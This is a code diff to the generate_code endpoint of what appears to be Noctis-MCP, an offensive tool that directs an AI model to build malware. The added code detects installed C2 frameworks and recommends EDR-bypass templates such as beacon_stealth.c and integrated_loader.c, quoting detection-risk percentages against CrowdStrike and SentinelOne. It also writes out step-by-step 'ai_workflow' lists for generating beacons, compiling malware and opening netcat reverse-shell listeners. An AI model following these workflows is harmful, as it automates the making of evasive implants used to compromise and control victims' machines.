@@ -549,7 +549,186 @@ def generate_code():
                     )
                     patterns_by_technique[tech_id] = patterns
 
-        # 3. Get VX-API function signatures needed
+        # 2.5. Detect Client OS and C2 Availability (NEW - Phase 5)
+        from server.utils.c2_detector import C2Detector
+
+        client_os = data.get('client_os', 'unknown')
+        target_os = data.get('target_os', 'Windows')
+
+        c2_available = {}
+        c2_mode = 'standalone'
+        c2_recommendation = None
+
+        logger.info(f"[C2 Detection] Client OS: {client_os}, Target OS: {target_os}")
+
+        # Only check for C2 frameworks on Linux clients
+        if client_os == 'Linux':
+            try:
+                c2_available = C2Detector.detect_all()
+
+                # Determine if we should use C2 integrated mode
+                if c2_available and any(word in objective.lower() for word in ['rat', 'beacon', 'implant', 'c2', 'backdoor']):
+                    c2_mode = 'integrated'
+
+                    # Get preferred framework
+                    c2_framework = C2Detector.get_preferred_framework()
+
+                    c2_recommendation = {
+                        'mode': 'integrated',
+                        'framework': c2_framework,
+                        'framework_info': c2_available[c2_framework],
+                        'endpoint': c2_available[c2_framework]['endpoint'],
+                        'protocols': c2_available[c2_framework]['protocols'],
+                        'listener_setup': c2_available[c2_framework]['listener_cmd'],
+                        'ai_workflow': [
+                            f"1. Call MCP tool: generate_c2_beacon('{c2_framework}', '<listener_host>', <port>)",
+                            f"2. Receive {c2_framework.capitalize()} shellcode from C2 framework",
+                            "3. Use beacon_stealth.c template to wrap shellcode",
+                            "4. Replace ExampleC2Callback() with actual C2 callback",
+                            "5. Call compile_malware() to build final binary",
+                            f"6. Instruct user to start listener: {c2_available[c2_framework]['listener_cmd']}"
+                        ],
+                        'full_automation': True
+                    }
+                    logger.info(f"[C2 Mode] INTEGRATED - Using {c2_framework} (client has C2 installed)")
+
+                else:
+                    # Linux but no C2 installed
+                    c2_mode = 'standalone'
+                    c2_recommendation = {
+                        'mode': 'standalone',
+                        'reason': 'No C2 framework detected on Linux client',
+                        'suggestion': 'User can install Sliver for full C2 integration',
+                        'install_option': {
+                            'available': True,
+                            'tool': 'install_c2_framework',
+                            'command': "Call MCP tool: install_c2_framework('sliver')",
+                            'description': 'Auto-install Sliver C2 (takes 2-3 minutes)'
+                        },
+                        'ai_workflow': [
+                            "1. Offer to install C2 framework (ask user permission)",
+                            "2. If user declines: Use process_injection_complete.c for standalone reverse shell",
+                            "3. Provide netcat listener command: nc -lvnp 4444"
+                        ],
+                        'full_automation': False
+                    }
+                    logger.info(f"[C2 Mode] STANDALONE - Linux client without C2 (can auto-install)")
+
+            except Exception as e:
+                logger.error(f"[C2 Detection] Error: {e}")
+                c2_mode = 'standalone'
+
+        elif client_os == 'Windows':
+            # Windows client - cannot run C2 server
+            c2_mode = 'standalone'
+            c2_recommendation = {
+                'mode': 'standalone',
+                'reason': 'Client OS is Windows (cannot run C2 server)',
+                'cross_platform_option': {
+                    'available': True,
+                    'description': 'Set up C2 server on separate Linux machine',
+                    'instructions': [
+                        "1. Deploy Noctis-MCP on a Linux server or VM",
+                        "2. Install C2 framework on Linux: curl https://sliver.sh/install | sudo bash",
+                        "3. Generate C2 beacon using Linux Noctis-MCP instance",
+                        "4. Transfer generated beacon to Windows for deployment"
+                    ]
+                },
+                'ai_workflow': [
+                    "1. Use process_injection_complete.c for standalone payload",
+                    "2. Generate reverse shell or bind shell callback",
+                    "3. Provide PowerShell listener setup for user",
+                    "4. NOTE: For full C2 capabilities, user needs Linux system"
+                ],
+                'full_automation': False
+            }
+            logger.info(f"[C2 Mode] STANDALONE - Windows client (no C2 server capability)")
+
+        else:
+            # Unknown OS - default to standalone
+            c2_mode = 'standalone'
+            c2_recommendation = {
+                'mode': 'standalone',
+                'reason': f'Unknown client OS: {client_os}',
+                'ai_workflow': [
+                    "1. Use standalone template (process_injection_complete.c)",
+                    "2. Generate basic payload without C2 integration"
+                ],
+                'full_automation': False
+            }
+            logger.info(f"[C2 Mode] STANDALONE - Unknown OS: {client_os}")
+
+        # 3. Search RAG for integration template recommendations
+        template_recommendation = None
+        objective_lower = objective.lower()
+
+        # Build query for template search
+        template_query = f"{objective} {target_av}"
+        if any(word in objective_lower for word in ['rat', 'beacon', 'implant', 'c2', 'backdoor']):
+            template_query += " beacon template C2"
+        elif 'inject' in objective_lower:
+            template_query += " injection template"
+        elif any(word in objective_lower for word in ['bypass', 'edr', 'evade']):
+            template_query += " edr bypass template"
+
+        # Search for templates (integration examples)
+        template_results = agentic_bp.rag_engine.search_knowledge(
+            query=template_query,
+            target_av=target_av,
+            n_results=5
+        )
+
+        # Find integration example templates
+        for result in template_results:
+            metadata = result.get('metadata', {})
+            if metadata.get('type') == 'integration_example':
+                template_recommendation = {
+                    'template_file': metadata.get('source'),
+                    'template_name': metadata.get('template_name'),
+                    'use_case': metadata.get('use_case'),
+                    'what_it_does': metadata.get('what_it_does'),
+                    'detection_risk': metadata.get('detection_risk'),
+                    'techniques_included': metadata.get('techniques_included'),
+                    'relevance_score': result.get('rerank_score', 0.5),
+                    'recommendation': f"Use {metadata.get('template_name')}.c as base template"
+                }
+                logger.info(f"[Code Gen] Recommending template: {metadata.get('template_name')}")
+                break
+
+        # If no specific template found, recommend based on target AV
+        if not template_recommendation:
+            if target_av.lower() in ['crowdstrike', 'sentinelone']:
+                template_recommendation = {
+                    'template_file': 'techniques/examples/integrated_loader.c',
+                    'template_name': 'integrated_loader',
+                    'use_case': 'Complete EDR bypass pipeline for advanced EDRs',
+                    'detection_risk': '2-5%',
+                    'techniques_included': 'ALL techniques',
+                    'relevance_score': 0.7,
+                    'recommendation': 'Use integrated_loader.c - enables ALL evasion techniques for maximum stealth'
+                }
+            elif any(word in objective_lower for word in ['rat', 'beacon', 'c2']):
+                template_recommendation = {
+                    'template_file': 'techniques/examples/beacon_stealth.c',
+                    'template_name': 'beacon_stealth',
+                    'use_case': 'C2 beacon with memory obfuscation',
+                    'detection_risk': '2-5% during sleep',
+                    'techniques_included': 'Zilean, ShellcodeFluctuation, Perun\'s Fart, SilentMoonwalk',
+                    'relevance_score': 0.7,
+                    'recommendation': 'Use beacon_stealth.c - optimized for persistent C2 implants'
+                }
+            else:
+                template_recommendation = {
+                    'template_file': 'techniques/examples/process_injection_complete.c',
+                    'template_name': 'process_injection_complete',
+                    'use_case': 'Focused injection with moderate evasion',
+                    'detection_risk': '3-5%',
+                    'techniques_included': 'SysWhispers3, PoolParty, Encryption',
+                    'relevance_score': 0.6,
+                    'recommendation': 'Use process_injection_complete.c - lightweight injection template'
+                }
+
+        # 4. Get VX-API function signatures needed
         vx_signatures = []
         all_functions_mentioned = set()
 
@@ -576,12 +755,21 @@ def generate_code():
                         'relevance': result.get('rerank_score', 0.5)
                     })
 
-        # 4. Synthesize overall guidance
+        # 5. Synthesize overall guidance
         overall_guidance = {
             'objective': objective or f"Implement {', '.join(technique_ids)}",
             'target_av': target_av,
+            'target_os': target_os,
+            'client_os': client_os,
             'opsec_level': opsec_level,
             'techniques_requested': technique_ids,
+
+            # C2 Integration (NEW - Phase 5)
+            'c2_integration': c2_recommendation,
+            'c2_mode': c2_mode,
+
+            # Template recommendation (NEW - Phase 5 integration)
+            'template_recommendation': template_recommendation,
 
             # Strategic intelligence (WHY and WHAT to avoid)
             'intelligence': intelligence_by_technique,
